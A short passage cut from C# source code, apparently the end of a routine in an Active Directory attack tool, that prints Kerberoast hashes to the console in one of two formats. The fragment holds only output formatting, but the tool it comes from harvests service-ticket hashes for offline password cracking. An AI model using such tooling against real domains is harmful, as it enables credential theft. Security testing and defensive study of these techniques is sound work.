}\n                        }\n                        header = true;\n                    }\n                }\n                else\n                {\n                    if (kerberoastDisplay)\n                    {\n                        Console.WriteLine("[*] Hash                   : {0}", hash);\n                    }\n                    else\n                    {\n                        Console.WriteLine("  Kerberoast Hash       :  {0}", hash);\n                    }\n                }\n            }\n        }\n    }\n}\n'